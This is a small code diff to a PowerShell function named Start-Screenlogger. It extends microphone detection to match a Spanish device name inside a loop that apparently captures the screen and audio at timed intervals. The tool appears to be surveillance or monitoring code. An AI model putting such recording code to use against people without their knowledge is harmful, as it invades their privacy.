@@ -67,7 +67,7 @@ function Start-Screenlogger{
     if($Delay -eq 0){$Delay=0}
     
     $count = 0;
-    $mic = (Get-CimInstance Win32_PnPEntity | Where-Object { $_.Name -like "*Microphone*" })[0].name;
+    $mic = (Get-CimInstance Win32_PnPEntity | Where-Object {($_.Name -like "*Microphone*") -or ($_.Name -like "*Micrófono*")})[0].name;
     
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
